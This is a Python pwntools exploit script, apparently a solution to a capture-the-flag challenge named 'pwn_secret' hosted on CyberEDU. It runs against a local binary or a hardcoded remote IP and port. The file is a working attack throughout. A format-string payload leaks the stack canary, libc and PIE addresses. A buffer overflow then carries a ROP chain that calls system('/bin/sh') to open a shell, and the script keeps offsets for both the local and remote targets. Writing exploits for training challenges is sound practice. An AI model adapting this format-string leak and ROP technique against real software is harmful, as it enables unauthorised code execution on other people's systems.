from pwn import *
elf = ELF('/home/kali/Downloads/pwn_secret')
p=elf.process()

cyberedu = '34.159.240.221:31316'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

print(elf.got)
#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

# %15$p is the canary
# %17$p  is libc + 0x1f68
# %19$p is PIE + 0xb6d

#to use gadgets we need to leak PIE base too

#name_payload = b"%15$p.%17$p.%19$p"

#for the remote version, canary at 15, pie+0xc40 at 16, libc+750 at 14
name_payload = b"%15$p.%3$p.%16$p"
p.recvuntil(b"Name: ")
p.sendline(name_payload)
p.recvuntil(b"Hillo ")
leaks = p.recvline().strip()
canary, libc_leak, pie_leak = leaks.split(b".")

canary = int(canary, 16)
libc_leak = int(libc_leak, 16)
pie_leak = int(pie_leak, 16)

print(f"canary: {hex(canary)}")
print(f"libc leak: {hex(libc_leak)}")
print(f"pie leak: {hex(pie_leak)}")

#local
#libc = libc_leak - 0x1f68 
pie = pie_leak - 0xb6d 

#remote
#libc-libc_start_main
libc = libc_leak - 0xF72C0
pie = pie_leak - 0xc40

print(f"libc: {hex(libc)}")
print(f"pie: {hex(pie)}")



#local
binsh_offset = 0x17fe3c
system_offset = 0x2b910

#remote
binsh_offset = 0x18cd57
system_offset = 0x45390

pop_rdi_ret = 0xca3 + pie
ret = 0x889 + pie

system = libc + system_offset
binsh = libc + binsh_offset

#puts to leak libc remote

puts_got = p64(pie + elf.got['puts'])
puts_plt = p64(pie + elf.plt['puts'])

p.recvuntil(b"Phrase: ")


          
payload = ( b"a"*136 +  #s1
	    p64(canary) + 
	    b"b" * 8 +  #rbp
	    p64(pop_rdi_ret) +
	    puts_got +
	    p64(ret) +
	    puts_plt
          )
          
payload = ( b"a"*136 +  #s1
	    p64(canary) + 
	    b"b" * 8 +  #rbp
	    p64(pop_rdi_ret) +
	    p64(binsh) +
	    p64(ret) +
	    p64(system)
          )
       
p.sendline(payload)

#p.recvuntil(b'same!\n')
#data = p.recvline().strip()
#val = u64(data.ljust(8, b"\x00"))
#print(hex(val))


p.interactive()
